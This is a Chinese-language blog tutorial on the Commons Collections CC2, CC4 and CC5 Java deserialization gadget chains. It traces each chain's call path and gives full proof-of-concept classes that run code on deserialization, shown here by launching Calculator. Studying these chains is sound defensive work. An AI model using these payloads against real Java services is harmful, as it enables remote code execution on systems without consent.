---  
title: CommonsCollections2 4 5链详解  
subtitle:  
date: 2024-01-17T20:30:14+08:00  
slug: 7bc64e4  
draft: false  
author:    
  name: N1Rvana    
  email: beichenghua@gmail.com    
  avatar: avatar.png  
description:  
keywords:  
license:  
comment: false  
weight: 0  
tags:    
  - CommonsCollections    
categories:    
  - Java    
hiddenFromHomePage: false  
hiddenFromSearch: false  
hiddenFromRss: false  
hiddenFromRelated: false  
summary:  
resources:  
  - name: featured-image  
    src: featured-image.jpg  
  - name: featured-image-preview  
    src: featured-image-preview.jpg  
toc: true  
math: false  
lightgallery: false  
password:  
message:  
repost:  
  enable: true  
  url:  
  
# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter  
---  
  
<!--more-->  
## CommonsCollections2-4-5链详解  
`Commons-Collections`版本为4.0  
### CommonsCollections4 链详解  
仍然是调用了`transform`方法，但入口点变了位置，这次利用了`TransformingComparator`类`compare()`方法中的`transform`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171808254.png)
在`PriorityQueue`类中的`readObject`方法恰好调用了`compare`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171809891.png)
跟进`heapify()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171810664.png)
跟进`siftDown()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171810083.png)
再跟进`siftDownUsingComparator()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171810025.png)
正好在这里调用了`compare()`方法  
构造一下`poc`  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections4.Transformer;    
import org.apache.commons.collections4.comparators.TransformingComparator;    
import org.apache.commons.collections4.functors.ChainedTransformer;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InstantiateTransformer;    
    
import javax.xml.transform.Templates;    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.PriorityQueue;    
    
public class CommonsCollections4 {    
    public static void main(String[] args) throws Exception {    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
    
        Field nameField = tc.getDeclaredField("_name");    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,"test");    
    
        Field bytecodesField = tc.getDeclaredField("_bytecodes");    
        bytecodesField.setAccessible(true);    
        byte[] code = Files.readAllBytes(Paths.get("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class"));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField("_tfactory");    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
    
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl});    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(TrAXFilter.class),    
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})    
        };    
    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);    
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);    
        Class priorityClass = priorityQueue.getClass();    
        Field sizeField = priorityClass.getDeclaredField("size");    
        sizeField.setAccessible(true);    
        sizeField.set(priorityQueue,2);    
    
        //serialize(priorityQueue);    
        unserialize("ser.bin");    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171826539.png)  
### CommonsCollections2 链详解  
利用`InvokerTransformer`方法，来调用`newTransformer()`来加载恶意类的调用  
```java  
package org.example.CommonsCollections;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import org.apache.commons.collections4.comparators.TransformingComparator;    
import org.apache.commons.collections4.functors.ConstantTransformer;    
import org.apache.commons.collections4.functors.InstantiateTransformer;    
import org.apache.commons.collections4.functors.InvokerTransformer;    
    
import javax.swing.text.AbstractDocument;    
import javax.xml.transform.Templates;    
import javax.xml.ws.spi.Invoker;    
import java.io.FileInputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.PriorityQueue;    
    
public class CommonsCollections2 {    
    public static void main(String[] args) throws Exception{    
        TemplatesImpl templatesImpl = new TemplatesImpl();    
        Class tc = templatesImpl.getClass();    
    
        Field nameField = tc.getDeclaredField("_name");    
        nameField.setAccessible(true);    
        nameField.set(templatesImpl,"test");    
    
        Field bytecodesField = tc.getDeclaredField("_bytecodes");    
        bytecodesField.setAccessible(true);    
        byte[] code = Files.readAllBytes(Paths.get("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class"));    
        byte[][] codes = {code};    
        bytecodesField.set(templatesImpl,codes);    
    
        Field tfactoryField = tc.getDeclaredField("_tfactory");    
        tfactoryField.setAccessible(true);    
        tfactoryField.set(templatesImpl,new TransformerFactoryImpl());    
    
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});    
    
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));    
    
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);    
    
        priorityQueue.add(templatesImpl);    
        priorityQueue.add(2);    
    
        Class c = transformingComparator.getClass();    
        Field transformerField = c.getDeclaredField("transformer");    
        transformerField.setAccessible(true);    
        transformerField.set(transformingComparator,invokerTransformer);    
    
//        serialize(priorityQueue);    
        unserialize("ser.bin");    
    }    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401171948223.png)
### CommonsCollections5 链详解  
这里利用了`TiedMapEntry`类中的`toString()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172007422.png)
接着又去调用了`getValue()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172007376.png)
然后调用了任意类的`get()`方法，这里直接用`LazyMap`类中的`get()`方法即可  
后面的直接用 CC1 部分链  
这里的入口点`readObject()`需要选一个有`toString()`方法的，这里用`BadAttributeValueExpException`类中的`readObject()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172010602.png)
构造`poc`  
```java  
package org.example.CommonsCollections;    
    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.keyvalue.TiedMapEntry;    
import org.apache.commons.collections.map.LazyMap;    
import org.apache.commons.collections4.map.TransformedMap;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.*;    
import java.lang.reflect.Field;    
import java.util.HashMap;    
import java.util.Map;    
    
public class CommonsCollections5 {    
    public static void main(String[] args) throws Exception{    
    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),    
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),    
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
    
        HashMap<Object, Object> map = new HashMap<>();    
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);    
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,1);    
    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);    
        Class c = Class.forName("javax.management.BadAttributeValueExpException");    
        Field valField = c.getDeclaredField("val");    
        valField.setAccessible(true);    
        valField.set(badAttributeValueExpException,tiedMapEntry);    
    
        //serialize(badAttributeValueExpException);    
        unserialize("ser.bin");    
    
    }    
    
    public static void serialize(Object obj) throws Exception{    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));    
        oos.writeObject(obj);    
    }    
    
    public static Object unserialize(String filename) throws Exception{    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));    
        Object obj = ois.readObject();    
        return obj;    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401172022766.png)
  